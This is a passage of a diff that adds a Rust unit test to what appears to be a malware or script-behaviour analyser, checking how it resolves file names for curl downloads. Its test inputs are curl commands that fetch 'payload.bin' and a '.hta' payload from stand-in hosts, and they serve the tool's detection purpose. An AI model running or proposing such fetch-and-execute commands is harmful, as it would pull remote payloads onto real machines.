@@ -8691,6 +8691,29 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_with_remote_name_strips_query_and_fragment_from_basename() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "curl --output-dir C:\\Temp -O https://x.example/payload.bin?sig=1#frag",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst: Some(d), .. }
+                    if src == "https://x.example/payload.bin?sig=1#frag"
+                        && d == "C:\\Temp\\payload.bin"
+            )
+        });
+        assert!(has, "traits: {:?}", env.traits);
+        assert!(
+            env.modified_filesystem
+                .contains_key("c:\\temp\\payload.bin"),
+            "downloaded file was not tracked with a resolved basename: {:?}",
+            env.modified_filesystem
+        );
+    }
+
+    #[test]
     fn curl_short_option_cluster_remote_name_uses_basename_for_later_execution() {
         let report = crate::analyze(
             br#"curl -LO https://curl-cluster-remote-name.example/payload.hta
